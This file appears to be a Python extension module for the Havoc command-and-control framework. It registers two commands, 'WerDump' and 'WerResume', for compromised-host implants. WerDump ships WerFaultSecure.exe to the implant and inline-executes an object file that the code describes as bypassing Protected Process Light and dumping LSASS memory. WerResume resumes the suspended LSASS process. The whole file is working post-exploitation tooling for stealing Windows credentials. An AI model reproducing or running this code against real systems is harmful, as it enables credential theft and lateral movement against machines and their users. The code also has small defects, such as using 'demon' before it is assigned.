#!/usr/bin/env python3
from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists


def WerDump(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    WerFaultData: bytes = b''

    WerFaultPath = "./dst/WerFaultSecure.exe"
    if exists(WerFaultPath) is False:
      demon.ConsoleWrite( demon.CONSOLE_ERROR, f"WerFaultSecure executable not found in path: {WerFaultPath}")
      return False

    WerFaultData = open(WerFaultPath, 'rb' ).read()
    if len(WerFaultData) == 0:
      demon.ConsoleWrite(demon.CONSOLE_ERROR, f"WerFaultSecure executable is empty" )
      return False

    packer.addstr(WerFaultData)
    # Get the agent instance based on demon ID
    demon = Demon(demon_id)
    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to bypass PPL and Dump Lsass")
    demon.InlineExecute(task_id, "go", "./dst/WerDump.o", packer.getbuffer(), False)
    return task_id

def WerResume(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    # Get the agent instance based on demon ID
    demon = Demon(demon_id)
    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to Resume Suspended Lsass")
    demon.InlineExecute(task_id, "go", "./dst/WerResume.o", packer.getbuffer(), False)
    return task_id

RegisterCommand(WerResume, "", "WerResume", "Resume Suspended Lsass", 0, "", "")
RegisterCommand(WerDump, "", "WerDump", "Bypass PPL with WerFaultSecure and Dump lsass", 0, "", "")
